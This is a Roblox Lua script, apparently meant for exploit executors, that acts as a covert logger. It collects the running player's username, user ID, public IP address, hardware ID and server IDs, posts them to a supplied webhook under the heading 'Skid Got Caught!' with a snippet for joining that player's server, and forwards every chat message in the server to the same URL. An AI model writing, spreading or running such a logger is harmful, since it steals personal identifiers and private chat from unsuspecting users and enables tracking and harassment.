local sessionid = tostring(os.time())

local lclplr = game:GetService("Players").LocalPlayer 
local getip = function(...)return game:HttpGet("http://api64.ipify.org/") or "<<UNKNOWN>>" end 

local gethwid = gethwid or function()return "<<UNKNOWN>>" end

local http_request = http_request or request or syn.http_request or function(...)return...end

local function SendMessage(url, msg)
    return http_request({
        Url = url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})
    })
end 

local mypersonalinfo_table = {
	["Display Name"] = lclplr.DisplayName,
	["Username"] = lclplr.Name,
	["User ID"] = tostring(lclplr.UserId),
	["IP"] = getip(),
	["HWID"] = gethwid(),
	["Game Universe ID"] = tostring(game.GameId),
	["Game Place ID"] = tostring(game.PlaceId),
	["Game Job ID"] = tostring(game.JobId)
} 

local mypersonalinfo = ""

for i,v in pairs(mypersonalinfo_table) do 
	mypersonalinfo = mypersonalinfo..tostring(i)..": "..tostring(v).."\n"
end 

local JoinMe = 'game:GetService("TeleportService"):TeleportToPlaceInstance('..tostring(game.PlaceId)..', "'..tostring(game.JobId)..'", game:GetService("Players").LocalPlayer);'

mypersonalinfo = "# Skid Got Caught! (#"..sessionid..")".."\n\n"..mypersonalinfo.."\n".."Join the skid by executing this code!: \n```lua\n"..JoinMe.."\n```"

local run = function(url)
	game:GetService("Players").PlayerChatted:Connect(function(tp,plr,msg)
		SendMessage(url,"[["..sessionid.."]] "..plr.DisplayName.." (@"..plr.Name..") >> "..msg)
	end)
	game.OnClose = function(rsn)
		SendMessage(url,"# SESSION #"..sessionid.." ENDED".."\n\n".."Reason: "..tostring(rsn))
	end
	return SendMessage(url,mypersonalinfo)
end 

return run 
